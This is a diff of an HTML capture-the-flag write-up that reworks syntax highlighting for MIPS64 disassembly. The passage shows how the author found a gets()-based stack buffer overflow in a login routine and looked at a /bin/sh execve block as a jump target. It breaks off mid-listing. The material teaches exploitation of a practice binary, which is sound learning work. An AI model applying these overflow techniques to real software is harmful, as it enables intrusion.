@@ -243,78 +243,78 @@ Menu:
 
 [guest@mipsy] $ 0
 </code></pre><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
-<pre><code class="language-x86asm" data-lang="x86asm">.globl authenticate
-authenticate:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#50fa7b">.globl</span> authenticate
+<span style="color:#8be9fd;font-style:italic">authenticate:</span>
 
-var_40= -0x40
-var_18= -0x18
-var_10= -0x10
-ret_addr= -8
+<span style="color:#50fa7b">var_40</span>= -<span style="color:#bd93f9">0x40</span>
+<span style="color:#50fa7b">var_18</span>= -<span style="color:#bd93f9">0x18</span>
+<span style="color:#50fa7b">var_10</span>= -<span style="color:#bd93f9">0x10</span>
+<span style="color:#50fa7b">ret_addr</span>= -<span style="color:#bd93f9">8</span>
 
-daddiu  $sp, -0x90       ; Doubleword Add Immediate Unsigned
-sd      $ra, 0x90+ret_addr($sp)  ; Store Doubleword
-sd      $fp, 0x90+var_10($sp)  ; Store Doubleword
-sd      $gp, 0x90+var_18($sp)  ; Store Doubleword
-move    $fp, $sp
-lui     $gp, 4           ; Load Upper Immediate
-daddu   $gp, $t9         ; Doubleword Add Unsigned
-daddiu  $gp, 0x3AA4      ; Doubleword Add Immediate Unsigned
-dli     $v0, 0x120020000  ; Doubleword Load Immediate
-daddiu  $a0, $v0, (aInputYourPassw - 0x120020000)  ; &quot;Input your password:&quot;
-dla     $v0, puts        ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; puts       ; Jump And Link Register
-nop
-dli     $v0, 0x120020000  ; Doubleword Load Immediate
-daddiu  $a0, $v0, (asc_120025B00 - 0x120020000)  ; &quot;&gt;&gt;&gt; &quot;
-dla     $v0, printf      ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; printf     ; Jump And Link Register
-nop
-dla     $v0, stdout      ; Load 64-bit address
-ld      $v0, (stdout - 0x120042BC8)($v0)  ; Load Doubleword
-move    $a0, $v0         ; stream
-dla     $v0, fflush      ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; fflush     ; Jump And Link Register
-nop
-move    $a0, $fp
-dla     $v0, gets        ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; gets       ; Jump And Link Register
-nop
-daddiu  $v0, $fp, 0x50   ; Doubleword Add Immediate Unsigned
-li      $a2, 0x20  ; ' '  ; n
-move    $a1, $zero       ; c
-move    $a0, $v0         ; s
-dla     $v0, memset      ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; memset     ; Jump And Link Register
-nop
-move    $a0, $fp         ; s
-dla     $v0, strlen      ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; strlen     ; Jump And Link Register
-nop
-daddiu  $v1, $fp, 0x50   ; Doubleword Add Immediate Unsigned
-move    $a2, $v1
-move    $a1, $v0
-move    $a0, $fp
-dla     $v0, kdf         ; Load 64-bit address
-move    $t9, $v0
-bal     kdf              ; Branch Always and Link
-nop
-daddiu  $v1, $fp, 0x50   ; Doubleword Add Immediate Unsigned
-li      $a2, 0x20  ; ' '  ; n
-dli     $v0, 0x120020000  ; Doubleword Load Immediate
-daddiu  $a1, $v0, (unk_120025B08 - 0x120020000)  ; s2
-move    $a0, $v1         ; s1
-dla     $v0, memcmp      ; Load 64-bit address
-move    $t9, $v0
-jalr    $t9 ; memcmp     ; Jump And Link Register
-nop
-bnez    $v0, loc_120004688  ; Branch on Not Zero
-</code></pre><p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf">this</a> and <a href="https://write.lain.faith/~/Haskal/mips-rop/">this</a>, I understood very quickly the main components of the architecture. And that&rsquo;s why I noticed a call to the <code>gets</code> function which as it&rsquo;s known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in <code>$fp</code>, which is initialized to <code>$sp-0x90</code>. Next the call to <code>gets</code>, <code>printf</code> and <code>fflush</code>, it calls <code>memset</code> to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the <code>kdf</code> function with the following arguments: <code>kdf(char *input_password, int input_length, unsigned char *out)</code>. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
+<span style="color:#50fa7b">daddiu</span>  $sp, -<span style="color:#bd93f9">0x90</span>       <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>sd      $ra, <span style="color:#bd93f9">0x90</span>+ret_addr($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>sd      $fp, <span style="color:#bd93f9">0x90</span>+var_10($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>sd      $gp, <span style="color:#bd93f9">0x90</span>+var_18($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>move    $fp, $sp
+<span style="color:#50fa7b">lui</span>     $gp, <span style="color:#bd93f9">4</span>           <span style="color:#6272a4">; Load Upper Immediate
+</span><span style="color:#6272a4"></span>daddu   $gp, $t9         <span style="color:#6272a4">; Doubleword Add Unsigned
+</span><span style="color:#6272a4"></span>daddiu  $gp, <span style="color:#bd93f9">0x3AA4</span>      <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>dli     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>daddiu  $a0, $v0, (aInputYourPassw - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; &#34;Input your password:&#34;
+</span><span style="color:#6272a4"></span>dla     $v0, puts        <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; puts       ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">dli</span>     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>daddiu  $a0, $v0, (asc_120025B00 - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; &#34;&gt;&gt;&gt; &#34;
+</span><span style="color:#6272a4"></span>dla     $v0, printf      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; printf     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">dla</span>     $v0, stdout      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>ld      $v0, (stdout - <span style="color:#bd93f9">0x120042BC8</span>)($v0)  <span style="color:#6272a4">; Load Doubleword
+</span><span style="color:#6272a4"></span>move    $a0, $v0         <span style="color:#6272a4">; stream
+</span><span style="color:#6272a4"></span>dla     $v0, fflush      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; fflush     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">move</span>    $a0, $fp
+<span style="color:#50fa7b">dla</span>     $v0, gets        <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; gets       ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">daddiu</span>  $v0, $fp, <span style="color:#bd93f9">0x50</span>   <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>li      $a2, <span style="color:#bd93f9">0x20</span>  <span style="color:#6272a4">; &#39; &#39;  ; n
+</span><span style="color:#6272a4"></span>move    $a1, $zero       <span style="color:#6272a4">; c
+</span><span style="color:#6272a4"></span>move    $a0, $v0         <span style="color:#6272a4">; s
+</span><span style="color:#6272a4"></span>dla     $v0, memset      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; memset     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">move</span>    $a0, $fp         <span style="color:#6272a4">; s
+</span><span style="color:#6272a4"></span>dla     $v0, strlen      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; strlen     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">daddiu</span>  $v1, $fp, <span style="color:#bd93f9">0x50</span>   <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>move    $a2, $v1
+<span style="color:#50fa7b">move</span>    $a1, $v0
+<span style="color:#50fa7b">move</span>    $a0, $fp
+<span style="color:#50fa7b">dla</span>     $v0, kdf         <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">bal</span>     kdf              <span style="color:#6272a4">; Branch Always and Link
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">daddiu</span>  $v1, $fp, <span style="color:#bd93f9">0x50</span>   <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>li      $a2, <span style="color:#bd93f9">0x20</span>  <span style="color:#6272a4">; &#39; &#39;  ; n
+</span><span style="color:#6272a4"></span>dli     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>daddiu  $a1, $v0, (unk_120025B08 - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; s2
+</span><span style="color:#6272a4"></span>move    $a0, $v1         <span style="color:#6272a4">; s1
+</span><span style="color:#6272a4"></span>dla     $v0, memcmp      <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>move    $t9, $v0
+<span style="color:#50fa7b">jalr</span>    $t9 <span style="color:#6272a4">; memcmp     ; Jump And Link Register
+</span><span style="color:#6272a4"></span>nop
+<span style="color:#50fa7b">bnez</span>    $v0, loc_120004688  <span style="color:#6272a4">; Branch on Not Zero
+</span></code></pre></div><p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf">this</a> and <a href="https://write.lain.faith/~/Haskal/mips-rop/">this</a>, I understood very quickly the main components of the architecture. And that&rsquo;s why I noticed a call to the <code>gets</code> function which as it&rsquo;s known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in <code>$fp</code>, which is initialized to <code>$sp-0x90</code>. Next the call to <code>gets</code>, <code>printf</code> and <code>fflush</code>, it calls <code>memset</code> to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the <code>kdf</code> function with the following arguments: <code>kdf(char *input_password, int input_length, unsigned char *out)</code>. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
 And the result of this encryption routine is compared to a constant value with <code>memcmp</code>.</p>
 <p>So we discovered the stack based buffer overflow which allows us to overwrite the saved instruction pointer saved at the functions&rsquo;s prologue.</p>
 <h2 id="exploitation">Exploitation</h2>
@@ -348,95 +348,95 @@ But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of
 <h4 id="one-gadget-">One gadget ?</h4>
 <p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
 I discovered during the reverse engineering part an interesting snippet of code:</p>
-<pre><code class="language-x86asm" data-lang="x86asm">.text:0000000120003FC0                 .globl ip
-.text:0000000120003FC0 ip:                                      ; CODE XREF: main+260↓p
-.text:0000000120003FC0                                          ; DATA XREF: LOAD:0000000120002438↑o ...
-.text:0000000120003FC0
-.text:0000000120003FC0 ret             = -0x1050
-.text:0000000120003FC0 n_read          = -0x104C
-.text:0000000120003FC0 fd              = -0x1048
-.text:0000000120003FC0 var_1044        = -0x1044
-.text:0000000120003FC0 buf             = -0x1040
-.text:0000000120003FC0 ptr_binsh       = -0x40
-.text:0000000120003FC0 dash_c          = -0x38
-.text:0000000120003FC0 var_30          = -0x30
-.text:0000000120003FC0 null            = -0x28
-.text:0000000120003FC0 var_18          = -0x18
-.text:0000000120003FC0 var_10          = -0x10
-.text:0000000120003FC0 var_8           = -8
-.text:0000000120003FC0
-.text:0000000120003FC0                 daddiu  $sp, -0x1050     ; Doubleword Add Immediate Unsigned
-.text:0000000120003FC4                 sd      $ra, 0x1050+var_8($sp)  ; Store Doubleword
-.text:0000000120003FC8                 sd      $fp, 0x1050+var_10($sp)  ; Store Doubleword
-.text:0000000120003FCC                 sd      $gp, 0x1050+var_18($sp)  ; Store Doubleword
-.text:0000000120003FD0                 move    $fp, $sp
-.text:0000000120003FD4                 lui     $gp, 4           ; Load Upper Immediate
-.text:0000000120003FD8                 daddu   $gp, $t9         ; Doubleword Add Unsigned
-.text:0000000120003FDC                 daddiu  $gp, 0x4060      ; Doubleword Add Immediate Unsigned
-.text:0000000120003FE0                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
-.text:0000000120003FE4                 daddiu  $v0, (aBinSh - 0x120020000)  ; &quot;/bin/sh&quot;
-.text:0000000120003FE8                 sd      $v0, 0x1010($fp)  ; Store Doubleword
-.text:0000000120003FEC                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
-.text:0000000120003FF0                 daddiu  $v0, (aC - 0x120020000)  ; &quot;-c&quot;
-.text:0000000120003FF4                 sd      $v0, 0x1018($fp)  ; Store Doubleword
-.text:0000000120003FF8                 dli     $v0, 0x120020000  ; Doubleword Load Immediate
-.text:0000000120003FFC                 daddiu  $v0, (aListInterfaces - 0x120020000)  ; &quot;./list_interfaces.sh&quot;
-.text:0000000120004000                 sd      $v0, 0x1020($fp)  ; Store Doubleword
-.text:0000000120004004                 sd      $zero, 0x1028($fp)  ; Store Doubleword
-.text:0000000120004008                 daddiu  $v0, $fp, 8      ; Doubleword Add Immediate Unsigned
-.text:000000012000400C                 move    $a0, $v0         ; pipedes
-.text:0000000120004010                 dla     $v0, pipe        ; Load 64-bit address
-.text:0000000120004014                 move    $t9, $v0
-.text:0000000120004018                 jalr    $t9 ; pipe       ; Jump And Link Register
-.text:000000012000401C                 nop
-.text:0000000120004020                 move    $v1, $v0
-.text:0000000120004024                 dli     $v0, 0xFFFFFFFFFFFFFFFF  ; Doubleword Load Immediate
-.text:0000000120004028                 bne     $v1, $v0, loc_120004070  ; Branch on Not Equal
-; skip
-.text:0000000120004070 loc_120004070:                           ; CODE XREF: ip+68↑j
-.text:0000000120004070                 dla     $v0, fork        ; Load 64-bit address
-.text:0000000120004074                 move    $t9, $v0
-.text:0000000120004078                 jalr    $t9 ; fork       ; Jump And Link Register
-.text:000000012000407C                 nop
-.text:0000000120004080                 sw      $v0, 0($fp)      ; Store Word
-.text:0000000120004084                 lw      $v1, 0($fp)      ; Load Word
-.text:0000000120004088                 dli     $v0, -1          ; Doubleword Load Immediate
-.text:000000012000408C                 bne     $v1, $v0, loc_1200040D4  ; Branch on Not Equal
-; skip
-.text:00000001200040D4 loc_1200040D4:                           ; CODE XREF: ip+CC↑j
-.text:00000001200040D4                 lw      $v0, 0($fp)      ; Load Word
-.text:00000001200040D8                 bnez    $v0, loc_120004158  ; Branch on Not Zero
-.text:00000001200040DC                 nop
-.text:00000001200040E0                 lw      $v0, 0xC($fp)    ; Load Word
-.text:00000001200040E4                 li      $a1, 1           ; fd2
-.text:00000001200040E8                 move    $a0, $v0         ; fd
-.text:00000001200040EC                 dla     $v0, dup2        ; Load 64-bit address
-.text:00000001200040F0                 move    $t9, $v0
-.text:00000001200040F4                 jalr    $t9 ; dup2       ; Jump And Link Register
-.text:00000001200040F8                 nop
-.text:00000001200040FC                 lw      $v0, 8($fp)      ; Load Word
-.text:0000000120004100                 move    $a0, $v0         ; fd
-.text:0000000120004104                 dla     $v0, close       ; Load 64-bit address
-.text:0000000120004108                 move    $t9, $v0
-.text:000000012000410C                 jalr    $t9 ; close      ; Jump And Link Register
-.text:0000000120004110                 nop
-.text:0000000120004114                 lw      $v0, 0xC($fp)    ; Load Word
-.text:0000000120004118                 move    $a0, $v0         ; fd
-.text:000000012000411C                 dla     $v0, close       ; Load 64-bit address
-.text:0000000120004120                 move    $t9, $v0
-.text:0000000120004124                 jalr    $t9 ; close      ; Jump And Link Register
-.text:0000000120004128                 nop
-.text:000000012000412C                 ld      $v0, 0x1010($fp)  ; Load Doubleword
-.text:0000000120004130                 daddiu  $v1, $fp, 0x1010  ; Doubleword Add Immediate Unsigned
-.text:0000000120004134                 move    $a2, $zero       ; envp
-.text:0000000120004138                 move    $a1, $v1         ; argv
-.text:000000012000413C                 move    $a0, $v0         ; path
-.text:0000000120004140                 dla     $v0, execve      ; Load 64-bit address
-.text:0000000120004144                 move    $t9, $v0
-.text:0000000120004148                 jalr    $t9 ; execve     ; Jump And Link Register
-.text:000000012000414C                 nop
-; skip
-</code></pre><p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span>                 .globl ip
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> ip:                                      <span style="color:#6272a4">; CODE XREF: main+260↓p
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FC0                                          <span style="color:#6272a4">; DATA XREF: LOAD:0000000120002438↑o ...
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FC0
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> ret             = -<span style="color:#bd93f9">0x1050</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> n_read          = -<span style="color:#bd93f9">0x104C</span> 
+.text:<span style="color:#bd93f9">0000000120003</span>FC0 fd              = -<span style="color:#bd93f9">0x1048</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> var_1044        = -<span style="color:#bd93f9">0x1044</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> buf             = -<span style="color:#bd93f9">0x1040</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> ptr_binsh       = -<span style="color:#bd93f9">0x40</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> dash_c          = -<span style="color:#bd93f9">0x38</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> var_30          = -<span style="color:#bd93f9">0x30</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> null            = -<span style="color:#bd93f9">0x28</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> var_18          = -<span style="color:#bd93f9">0x18</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> var_10          = -<span style="color:#bd93f9">0x10</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span> var_8           = -<span style="color:#bd93f9">8</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span>
+<span style="color:#8be9fd;font-style:italic">.text:</span>0000000120003<span style="color:#50fa7b">FC0</span>                 daddiu  $sp, -<span style="color:#bd93f9">0x1050</span>     <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FC4                 sd      $ra, <span style="color:#bd93f9">0x1050</span>+var_8($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FC8                 sd      $fp, <span style="color:#bd93f9">0x1050</span>+var_10($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FCC                 sd      $gp, <span style="color:#bd93f9">0x1050</span>+var_18($sp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FD0                 move    $fp, $sp         <span style="color:#6272a4">; prologue
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FD4                 lui     $gp, <span style="color:#bd93f9">4</span>           <span style="color:#6272a4">; Load Upper Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FD8                 daddu   $gp, $t9         <span style="color:#6272a4">; Doubleword Add Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FDC                 daddiu  $gp, <span style="color:#bd93f9">0x4060</span>      <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FE0                 dli     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FE4                 daddiu  $v0, (aBinSh - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; &#34;/bin/sh&#34;
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FE8                 sd      $v0, <span style="color:#bd93f9">0x1010</span>($fp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FEC                 dli     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FF0                 daddiu  $v0, (aC - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; &#34;-c&#34;
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FF4                 sd      $v0, <span style="color:#bd93f9">0x1018</span>($fp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FF8                 dli     $v0, <span style="color:#bd93f9">0x120020000</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120003</span>FFC                 daddiu  $v0, (aListInterfaces - <span style="color:#bd93f9">0x120020000</span>)  <span style="color:#6272a4">; &#34;./list_interfaces.sh&#34;
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004000</span>                 sd      $v0, <span style="color:#bd93f9">0x1020</span>($fp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004004</span>                 sd      $zero, <span style="color:#bd93f9">0x1028</span>($fp)  <span style="color:#6272a4">; Store Doubleword
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004008</span>                 daddiu  $v0, $fp, <span style="color:#bd93f9">8</span>      <span style="color:#6272a4">; Doubleword Add Immediate Unsigned
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000400</span>C                 move    $a0, $v0         <span style="color:#6272a4">; pipedes
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004010</span>                 dla     $v0, pipe        <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004014</span>                 move    $t9, $v0         <span style="color:#6272a4">; pipe
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004018</span>                 jalr    $t9 <span style="color:#6272a4">; pipe       ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000401</span>C                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004020</span>                 move    $v1, $v0         <span style="color:#6272a4">; return value
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004024</span>                 dli     $v0, <span style="color:#bd93f9">0xFFFFFFFFFFFFFFFF</span>  <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004028</span>                 bne     $v1, $v0, loc_120004070  <span style="color:#6272a4">; Branch on Not Equal
+</span><span style="color:#6272a4">; skip
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004070</span> loc_120004070:                           <span style="color:#6272a4">; CODE XREF: ip+68↑j
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004070</span>                 dla     $v0, fork        <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004074</span>                 move    $t9, $v0         <span style="color:#6272a4">; fork
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004078</span>                 jalr    $t9 <span style="color:#6272a4">; fork       ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000407</span>C                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004080</span>                 sw      $v0, <span style="color:#bd93f9">0</span>($fp)      <span style="color:#6272a4">; Store Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004084</span>                 lw      $v1, <span style="color:#bd93f9">0</span>($fp)      <span style="color:#6272a4">; Load Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004088</span>                 dli     $v0, -<span style="color:#bd93f9">1</span>          <span style="color:#6272a4">; Doubleword Load Immediate
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000408</span>C                 bne     $v1, $v0, loc_1200040D4  <span style="color:#6272a4">; Branch on Not Equal
+</span><span style="color:#6272a4">; skip
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>D4 loc_1200040D4:                           <span style="color:#6272a4">; CODE XREF: ip+CC↑j
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>D4                 lw      $v0, <span style="color:#bd93f9">0</span>($fp)      <span style="color:#6272a4">; Load Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>D8                 bnez    $v0, loc_120004158  <span style="color:#6272a4">; Branch on Not Zero
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>DC                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>E0                 lw      $v0, <span style="color:#bd93f9">0xC</span>($fp)    <span style="color:#6272a4">; Load Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>E4                 li      $a1, <span style="color:#bd93f9">1</span>           <span style="color:#6272a4">; fd2
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>E8                 move    $a0, $v0         <span style="color:#6272a4">; fd
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>EC                 dla     $v0, dup2        <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>F0                 move    $t9, $v0         <span style="color:#6272a4">; dup2
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>F4                 jalr    $t9 <span style="color:#6272a4">; dup2       ; Jump And Link Register
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>F8                 nop                      <span style="color:#6272a4">; nop
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">00000001200040</span>FC                 lw      $v0, <span style="color:#bd93f9">8</span>($fp)      <span style="color:#6272a4">; Load Word
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004100</span>                 move    $a0, $v0         <span style="color:#6272a4">; fd
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004104</span>                 dla     $v0, close       <span style="color:#6272a4">; Load 64-bit address
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">0000000120004108</span>                 move    $t9, $v0         <span style="color:#6272a4">; close
+</span><span style="color:#6272a4"></span>.text:<span style="color:#bd93f9">000000012000410</span>C                 jalr    $t9 <span style="color:#6272a4">; close      ; Jump And Link Register
